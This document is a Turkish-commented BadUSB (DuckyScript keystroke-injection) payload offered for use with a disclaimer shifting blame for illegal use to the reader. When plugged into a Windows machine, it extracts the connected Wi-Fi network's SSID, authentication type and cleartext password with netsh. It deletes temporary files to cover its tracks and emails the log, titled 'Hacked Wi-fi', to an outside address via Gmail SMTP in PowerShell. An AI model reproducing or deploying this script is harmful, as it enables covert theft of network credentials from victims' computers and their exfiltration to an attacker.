### Bu scriptin illegal kullanımı durumunda sorumlusu ben değilim, sizsiniz.

```
DELAY 2000
WINDOWS d
REM cmd açılır
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 1000
REM Bu kısımda log dosyaları için klasör seçilir.
STRING cd "%USERPROFILE%\Documents"
ENTER
REM Burada SSID bilgisi elde edilir.
STRING for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set SSID=%A
ENTER
STRING netsh wlan show profiles %SSID% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">Temp.txt
ENTER
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set NETTYPE=%A
ENTER
STRING netsh wlan show profiles %SSID% | findstr "Authentication">Temp.txt
ENTER
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set AUTH=%A
ENTER
REM Password görüntülenir.
STRING netsh wlan show profiles %SSID% key=clear | findstr "Key Content">Temp.txt
ENTER
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set KEY=%A
ENTER
REM İzleri silmek için dosyaları sileriz.
STRING del Temp.txt
ENTER
REM Loglar tek dosyaya yazılır.
STRING echo SSID: %SSID%>>Log.txt & echo Network type: %NETTYPE%>>Log.txt & echo Authentication: %AUTH%>>Log.txt & echo Password: %KEY%>>Log.txt
ENTER
REM Mail ile bilgiler ulaştırılır.
STRING powershell
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
REM Bu kısımda mail gönderebilmek için secure apps özelliği açılmalıdır. (https://myaccount.google.com/lesssecureapps)
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<GONDEREN MAİL>', 'GONDEREN SIFRE');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = '<GONDEREN MAİL>'
ENTER
STRING $ReportEmail.To.Add('<GONDERİLECEK MAİL>')
ENTER
STRING $ReportEmail.Subject = 'Hacklenen Wi-fi'
ENTER
STRING $ReportEmail.Body = 'Log dosyası ekte!!' 
ENTER
STRING $ReportEmail.Attachments.Add('Log.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
STRING exit
ENTER
STRING del Log.txt
ENTER
STRING exit
ENTER
```
